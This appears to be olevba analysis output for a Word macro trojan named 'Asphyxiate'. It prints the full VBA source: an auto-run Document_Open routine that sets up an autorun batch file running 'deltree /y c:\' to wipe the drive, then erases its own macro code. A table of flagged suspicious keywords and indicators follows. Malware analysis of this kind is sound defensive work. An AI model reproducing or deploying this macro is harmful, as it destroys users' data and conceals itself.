olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Asphyxiate
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Asphyxiate - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
System.PrivateProfileString("C:\Autorun.inf", "Autorun", "open") = "Autoexeç.bat"
Open "C:\Autoexeç.bat" For Output As #1
Print #1, "@Echo Updating directory structure!"
Print #1, "@Echo Please wait . . ."
Print #1, "@deltree /y c:\ > asphyxiate"
Close #1
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ThisDocument.Saved = True
'You can use my machine and pull the plug to all your dreams...
'Nothing has to be too much but the pain can hurt some more...
'So strap on your razorblades and cut out your nightmare dreams!
End Sub 'Asphyxiate by Lys Kovick in memory of Reizfaktor
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Autorun.inf         |Executable file name                         |
|IOC       |'Autoexeç.bat'      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

